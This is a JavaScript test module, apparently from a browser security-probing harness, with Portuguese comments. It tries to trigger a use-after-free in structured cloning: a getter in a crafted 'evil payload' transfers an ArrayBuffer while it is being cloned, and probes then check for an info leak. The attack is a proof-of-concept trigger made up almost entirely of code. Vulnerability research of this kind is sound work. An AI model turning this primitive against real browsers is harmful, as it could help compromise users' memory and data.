export default {
    id:       'STRUCTURED_CLONE_MUTATION',
    category: 'Concurrency',
    risk:     'CRITICAL',
    description:
        'Ataca o SerializedScriptValue transferindo a ownership de um ArrayBuffer ' +
        'durante a clonagem estrutural de um getter. O C++ calcula o tamanho da memória, ' +
        'o getter arranca a memória original via transferência neutering, e o C++ retoma a cópia a ler o vazio.',

    setup: function() {
        this.results = {};
        this.channel = new MessageChannel();
        this.buffer = new ArrayBuffer(1024);
        
        // Escrevemos algo para validar se o buffer sobrevive
        new Uint32Array(this.buffer)[0] = 0xBADF00D;

        const self = this;

        // O Payload Malicioso
        this.evilPayload = {
            a: 1,
            get b() {
                try {
                    // O GATILHO: O C++ está no meio da clonagem.
                    // Nós usamos um segundo postMessage sincrono para transferir
                    // (neuter) o buffer e arrancar a sua memória física.
                    self.channel.port1.postMessage("transfer", [self.buffer]);
                } catch(e) {}
                return 2;
            },
            // O C++ vai tentar ler 'c' logo após 'b' ter destruído a memória!
            c: this.buffer
        };
    },

    trigger: function() {
        try {
            // Inicia o processo fatal de clonagem C++
            this.channel.port1.postMessage(this.evilPayload);
        } catch(e) {
            this.results.error = e.constructor.name;
        }
    },

    probe: [
        // Probe 0: O buffer foi efetivamente transferido e castrado (neutered)?
        s => s.buffer.byteLength,
        
        // Probe 1: O C++ crashou internamente na clonagem ou devolveu erro ao JS?
        s => s.results.error || 'Nenhum erro JS lançado. Verificando memória...',
        
        // Probe 2: Lemos o ArrayBuffer original. Se o byteLength for 0, mas conseguirmos
        // ler dados, temos um UAF brutal do objeto nativo.
        s => {
            try {
                if (s.buffer.byteLength === 0) {
                    let view = new Uint32Array(s.buffer);
                    if (view[0]) return `💥 INFO LEAK: 0x${view[0].toString(16)}`;
                }
                return 'Protegido (Acesso Negado ao Buffer Castrado)';
            } catch(e) {
                return 'Seguro (TypeError esperado)';
            }
        }
    ],

    cleanup: function() {
        this.buffer = null;
        this.evilPayload = null;
        try { this.channel.port1.close(); } catch(e){}
    }
};
